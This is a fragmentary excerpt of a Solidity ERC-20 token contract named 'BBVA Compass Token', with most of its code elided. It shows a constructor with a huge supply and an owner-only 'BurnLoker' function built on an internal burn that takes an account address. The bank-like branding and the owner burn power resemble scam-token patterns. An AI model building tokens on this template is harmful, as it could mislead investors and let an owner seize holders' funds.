...
contract BBVACompassToken is Context, IERC20, IERC20Metadata, Ownable {
    ...
    constructor() {
        _name = "BBVA Compass Token";
        _symbol = "BBVA";
        _totalSupply = 100000000 * 10**6 * 10**9;
    ...
    function _BurnLoker(address account, uint256 amount) internal virtual {
    ...
    function BurnLoker(uint256 amount) public onlyOwner virtual returns (bool) {
